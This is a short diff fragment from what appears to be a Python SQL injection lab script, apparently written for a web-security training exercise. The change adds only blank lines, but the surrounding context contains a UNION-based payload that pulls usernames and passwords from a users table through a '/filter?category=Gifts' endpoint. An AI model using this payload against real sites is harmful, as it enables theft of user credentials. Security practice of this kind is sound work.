@@ -16,6 +16,8 @@ def find_no_of_columns(url):
             return i-1
     return False
 
+    
+
 def find_credentials(s, url):
     path = '/filter?category=Gifts'
     payload_list = "'UNION+select+username,password+from+users--"
